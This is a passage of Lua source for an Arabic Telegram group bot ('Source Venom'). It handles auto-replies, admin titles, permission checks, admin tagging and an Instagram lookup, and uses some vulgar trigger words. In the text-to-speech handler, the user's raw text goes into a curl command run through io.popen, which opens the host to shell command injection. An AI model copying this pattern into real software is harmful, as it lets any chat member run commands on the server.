database:del(bot_id.."botss:VENOM:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:VENOM:List:Rd:Sudo", text)
return false
end
end
if text == ("مسح الردود المتعدده") and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local list = database:smembers(bot_id.."botss:VENOM:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:VENOM:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:VENOM:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:VENOM:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:VENOM:List:Rd:Sudo")
end
send(msg.chat_id_, msg.id_," 𖥔تم مسح ردود المتعدده")
end
------------------------------------------------------------------------
if text1 then 
send(msg.chat_id_, msg.id_,text1)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if veico then 
sendVoice(msg.chat_id_, msg.id_, 0, 1, nil, veico)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if video then 
sendVideo(msg.chat_id_, msg.id_, 0, 1, nil,video)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if anemi then 
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, anemi, '', nil)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if document then
sendDocument(msg.chat_id_, msg.id_, 0, 1,nil, document)   
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
if audio then
sendAudio(msg.chat_id_,msg.id_,audio)  
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if photo then
sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil,photo,'')
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end  
end
end
if text == ("مسح الردود") and Manager(msg) then
local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..v..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..v..msg.chat_id_)
database:del(bot_id..'List:Manager'..msg.chat_id_)
end
send(msg.chat_id_, msg.id_," 𖥔 تم مسح الردود")
end

if text == ("الردود") and Manager(msg) then
local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
text = " 𖥔 قائمه الردود \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_) then
db = 'متحركه'
elseif database:get(bot_id.."Add:Rd:Manager:Vico"..v..msg.chat_id_) then
db = 'بصمه'
elseif database:get(bot_id.."Add:Rd:Manager:Stekrs"..v..msg.chat_id_) then
db = 'ملصق'
elseif database:get(bot_id.."Add:Rd:Manager:Text"..v..msg.chat_id_) then
db = 'رساله'
elseif database:get(bot_id.."Add:Rd:Manager:Photo"..v..msg.chat_id_) then
db = 'صوره'
elseif database:get(bot_id.."Add:Rd:Manager:Video"..v..msg.chat_id_) then
db = 'فيديو'
elseif database:get(bot_id.."Add:Rd:Manager:File"..v..msg.chat_id_) then
db = 'ملف'
elseif database:get(bot_id.."Add:Rd:Manager:Audio"..v..msg.chat_id_) then
db = 'اغنيه'
end
text = text..""..k..">> 「 '..v..' 」  ↚ 「 '..db..' 」\n"
end
if #list == 0 then
text = " 𖥔 لا يوجد ردود للمدير"
end
send(msg.chat_id_, msg.id_,'['..text..']')
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id..'Text:Manager「'..msg.sender_user_id_..'」:'..msg.chat_id_..'')
if database:get(bot_id..'Set:Manager:rd「'..msg.sender_user_id_..'」:'..msg.chat_id_) == 'true1' then
database:del(bot_id..'Set:Manager:rd「'..msg.sender_user_id_..'」:'..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Add:Rd:Manager:Stekrs"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Add:Rd:Manager:Vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Add:Rd:Manager:Gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
database:set(bot_id.."Add:Rd:Manager:Text"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:Manager:Audio"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:Manager:File"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:Manager:Video"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Add:Rd:Manager:Photo"..test..msg.chat_id_, photo_in_group)  
end
send(msg.chat_id_, msg.id_,' 𖥔 تم حفظ الرد')
return false  
end  
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Manager:rd「'..msg.sender_user_id_..'」:'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,' 𖥔 ارسل الرد الذي تريد اضافته')
database:set(bot_id..'Set:Manager:rd「'..msg.sender_user_id_..'」:'..msg.chat_id_,'true1')
database:set(bot_id..'Text:Manager「'..msg.sender_user_id_..'」:'..msg.chat_id_, text)
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:sadd(bot_id..'List:Manager'..msg.chat_id_..'', text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Manager:rd「'..msg.sender_user_id_..'」:'..msg.chat_id_..'') == 'true2' then
send(msg.chat_id_, msg.id_,' 𖥔 تم ازالة الرد ')
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:del(bot_id..'Set:Manager:rd「'..msg.sender_user_id_..'」:'..msg.chat_id_)
database:srem(bot_id..'List:Manager'..msg.chat_id_..'', text)
return false
end
end
if text == 'اضف رد' and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,' 𖥔 ارسل الكلمه التي تريد اضافتها')
database:set(bot_id..'Set:Manager:rd「'..msg.sender_user_id_..'」:'..msg.chat_id_,true)
return false 
end
if text == 'مسح رد' and Manager(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
send(msg.chat_id_, msg.id_,' 𖥔 ارسل الكلمه التي تريد مسحها')
database:set(bot_id..'Set:Manager:rd「'..msg.sender_user_id_..'」:'..msg.chat_id_,'true2')
return false 
end
if text and not database:get(bot_id..'Reply:Manager'..msg.chat_id_) then
if not database:sismember(bot_id..'Spam:Texting'..msg.sender_user_id_,text) then
local anemi = database:get(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
local veico = database:get(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
local stekr = database:get(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
local text1 = database:get(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
local photo = database:get(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
local video = database:get(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
local document = database:get(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
local audio = database:get(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
------------------------------------------------------------------------
if text and text:match("^قول (.*)$") then
local Textxt = text:match("^قول (.*)$")
send(msg.chat_id_, msg.id_, '['..Textxt..']')
end
if text and text:match("^انطق (.*)$") then   
local textntk = text:match("^انطق (.*)$")   
UrlAntk = https.request('https://apiabs.ml/Antk.php?abs='..URL.escape(textntk)..'')   
Antk = JSON.decode(UrlAntk)   
if UrlAntk.ok ~= false then   
download_to_file("https://translate"..Antk.result.google..Antk.result.code.."UTF-8"..Antk.result.utf..Antk.result.translate.."&tl=ar-IN",Antk.result.translate..'.mp3')    
local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. msg.chat_id_ ..'" -F "document=@'..''..textntk..'.mp3'..'"' io.popen(curlm) 
end   
end

if text == "كلمني" then
rpl = {"ها هلاو","انطق","كول"};
sender = rpl[math.random(#rpl)]
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendmessage?chat_id=' .. msg.sender_user_id_ .. '&text=' .. URL.escape(sender))
end
if text == 'حصل' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/18&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'كسمهم' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/19&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
if text == 'انا جيت' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/comxnxp/20&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'طرطر' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/comxnxp/21&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end


if text == 'عركني' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/D_V1_D/94&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'لائيم' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/D_V1_D/93&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'موت' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendsticker?chat_id=' .. msg.chat_id_ .. '&sticker=https://t.me/D_V1_D/95&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end

if text == 'بخ' then
local Text = [[
يوه خدتني اجدع
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'Sꪮꪊ𝘳ᥴꫀ Vꫀꪀꪮꪑ', url="t.me/SOURCEVENOM"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendanimation?chat_id=' .. msg.chat_id_ .. '&animation=https://t.me/D_V1_D/96&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text and text:match("^وضع لقب (.*)$") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
local timsh = text:match("^وضع لقب (.*)$")
function start_function(extra, result, success)
local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
local getInfo = JSON.decode(chek)
if getInfo.result.can_promote_members == false then
send(msg.chat_id_, msg.id_,' 𖥔لا يمكنني تعديل  او وضع لقب ليس لدي صلاحيه\n 𖥔قم بترقيتي جميع الصلاحيات او صلاحية اضافه مشرف ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔 الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..') '
status  = '\n 𖥔 الايدي  ↚ '..result.sender_user_id_..'\n 𖥔تم ضافه {'..timsh..'} كلقب له'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
https.request("https://api.telegram.org/bot"..token.."/setChatAdministratorCustomTitle?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&custom_title="..timsh)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end

if text == ("مسح لقب") and msg.reply_to_message_id_ ~= 0 and Constructor(msg) then
function start_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔 البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖥔  الـعـضو   ↚ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖥔  الايدي  ↚ `'..result.sender_user_id_..'`\n 𖥔  تم مسح لقبه من الجروب'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
return false
end
if text and text:match("^مسح لقب @(.*)$") and Constructor(msg) then
local username = text:match("^مسح لقب @(.*)$")
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,' 𖥔 البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
function start_function(extra, result, success)
if result.id_ then
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_," 𖥔  عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
end      
usertext = '\n 𖥔  الـعـضو   ↚ ['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖥔  تم مسح لقبه من الجروب'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
send(msg.chat_id_, msg.id_, '⚠¦ لا يوجد حساب بهاذا المعرف')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
return false
end

if text == 'لقبي' and tonumber(msg.reply_to_message_id_) == 0 then
Ge = https.request("https://api.telegram.org/bot"..token.."/getChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..msg.sender_user_id_)
GeId = JSON.decode(Ge)
if not GeId.result.custom_title then
send(msg.chat_id_, msg.id_,' 𖥔وينك وين القب ') 
else
send(msg.chat_id_, msg.id_,' 𖥔لقبك هو : '..GeId.result.custom_title) 
end
end
if text == "فحص البوت" and Manager(msg) then
local chek = https.request('https://api.telegram.org/bot'..token..'/getChatMember?chat_id='..msg.chat_id_..'&user_id='..bot_id)
local getInfo = JSON.decode(chek)
if getInfo.ok == true then
if getInfo.result.can_change_info == true then
INf = '❴ ✔️ ❵' 
else 
INf = '❴ ✖ ❵' 
end
if getInfo.result.can_delete_messages == true then
DEL = '❴ ✔️ ❵' 
else 
DEL = '❴ ✖ ❵' 
end
if getInfo.result.can_invite_users == true then
INv = '❴ ✔️ ❵' 
else
INv = '❴ ✖ ❵' 
end
if getInfo.result.can_pin_messages == true then
Pin = '❴ ✔️ ❵' 
else
Pin = '❴ ✖ ❵' 
end
if getInfo.result.can_restrict_members == true then
REs = '❴ ✔️ ❵' 
else 
REs = '❴ ✖ ❵' 
end
if getInfo.result.can_promote_members == true then
PRo = '❴ ✔️ ❵'
else
PRo = '❴ ✖ ❵'
end 
send(msg.chat_id_, msg.id_,'\n 𖥔صلاحيات البوت هي\n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n 𖥔  علامة ال {✔️} تعني مفعل\n 𖥔  علامة ال {✖} تعني غير مفعل\n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n 𖥔تغير معلومات المجموعة ↞ '..INf..'\n 𖥔مسح الرسائل ↞ '..DEL..'\n 𖥔حظر المستخدمين ↞ '..REs..'\n 𖥔دعوة المستخدمين ↞ '..INv..'\n 𖥔ثتبيت الرسالة ↞ '..Pin..'\n 𖥔اضافة مشرفين ↞ '..PRo)   
end
end
if text == "تعطيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_, '⌯ تم تعطيل الانستا')
database:set(bot_id.."textchuser:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'⌯ تم تفعيل الانستا')
database:set(bot_id.."textchuser:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."textchuser:insta_bot"..msg.chat_id_) == "open" then
local Textni = text:match("^معلومات (.*)$")
data,res = https.request('https://forhassan.ml/Black/insta.php?username='..URL.escape(Textni)..'')
if res == 200 then
muaed = json:decode(data)
if muaed.Info == true then
local filee = download_to_file(muaed.ph,msg.sender_user_id_..'.jpg')
sendPhoto(msg.chat_id_, msg.id_,'./「'..msg.sender_user_id_..'」.jpg',muaed.info)     
os.execute('rm -rf ./「'..msg.sender_user_id_..'」.jpg') 
end
end
end
if text and text == "تفعيل تاك المشرفين" and Manager(msg) then 
database:set(bot_id.."textchuser:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_," 𖥔تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."textchuser:Tag:Admins:"..msg.chat_id_)
send(msg.chat_id_, msg.id_, " 𖥔تم تعطيل تاك المشرفين")
end

if text == 'صيح المشرفين' or text == "تاك للمشرفين" or text == "وين المشرفين" or text == "المشرفين" then
if database:get(bot_id.."textchuser:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,b)  
if b.username_ then 
User_id = "@"..b.username_
else
User_id = msg.sender_user_id_
end --الكود حصري سورس فينوميعني لو بكتهن راح اعرفك انت الاخذتهن
local t = "\n 𖥔المستخدم ~ ["..User_id .."] يصيح المشرفين \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
k = 0
for i,v in pairs(data.members_) do
if bot_id ~= v.user_id_ then 
k = k + 1
local username = database:get(bot_id.."user:Name"..v.user_id_)
if database:get(bot_id..'user:Name'..v.user_id_) then
t = t..""..k.." → {[@"..database:get(bot_id..'user:Name'..v.user_id_).."]}\n"
else
t = t..""..k.." → {`"..v.user_id_.."`}\n"
end
end
end
send(msg.chat_id_, msg.id_,t)
end,nil)
end,nil)
end
end

if text == "الساعه" then
local ramsesj20 = "\n الساعه الان : "..os.date("%I:%M%p")
send(msg.chat_id_, msg.id_,ramsesj20)
end

if text == "التاريخ" then
local ramsesj20 =  "\n التاريخ : "..os.date("%Y/%m/%d")
send(msg.chat_id_, msg.id_,ramsesj20)
end
--------------
--- هههه ها فرخ دتبوك ؟ ههههههههههه 
if text == ("الردود المتعدده") and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
local list = database:smembers(bot_id.."botss:VENOM:List:Rd:Sudo")
text = "\nقائمة ردود المتعدده \n⩹━━━━「𝐕𝐄𝐍𝐎𝐌」━━━━⩺\n"
for k,v in pairs(list) do
db = "رساله "
text = text..""..k.." => 「 '..v..' 」 => 「 '..db..' 」\n"
end
if #list == 0 then
text = "لا توجد ردود متعدده"
end
send(msg.chat_id_, msg.id_,"["..text.."]")
end

if text == "اضف رد متعدد" and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_," 𖥔ارسل الرد الذي اريد اضافته")
end
if text == "مسح رد متعدد" and CoSu(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
else
send(msg.chat_id_, msg.id_,' 𖥔 لا تستطيع استخدام البوت \n 𖥔  يرجى الاشتراك بالقناه اولا \n 𖥔  اشترك هنا ['..database:get(bot_id..'add:ch:username')..']')
end
return false
end
database:set(bot_id.."botss:VENOM:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_," 𖥔ارسل الان الكلمه لمسحها ")
end
if text then  
local test = database:get(bot_id.."botss:VENOM:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:VENOM:Add:Rd:Sudo:Text"..test, text)  
end  
send(msg.chat_id_, msg.id_," 𖥔تم حفظ الرد الاول ارسل الرد الثاني")
return false  
end  
end
if text then  
local test = database:get(bot_id.."botss:VENOM:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:VENOM:Add:Rd:Sudo:Text1"..test, text)  
end  
send(msg.chat_id_, msg.id_," 𖥔تم حفظ الرد الثاني ارسل الرد الثالث")
return false  
end  
end
if text then  
local test = database:get(bot_id.."botss:VENOM:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:VENOM:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:VENOM:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_," 𖥔تم حفظ الرد")
return false  
end  
end
if text then
local Text = database:get(bot_id.."botss:VENOM:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:VENOM:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:VENOM:Add:Rd:Sudo:Text2"..text)   
if Text or Text1 or Text2 then 
local texting = {
Text,
Text1,
Text2
}
Textes = math.random(#texting)
send(msg.chat_id_, msg.id_,texting[Textes])
end
end
------------------------------------------------------------------------
if text1 then 
send(msg.chat_id_, msg.id_, text1)
database:sadd(bot_id..'Spam:Texting'..msg.sender_user_id_,text) 
end
if stekr then 
sendSticker(msg.chat_id_, msg.id_, 0, 1, nil, stekr)   
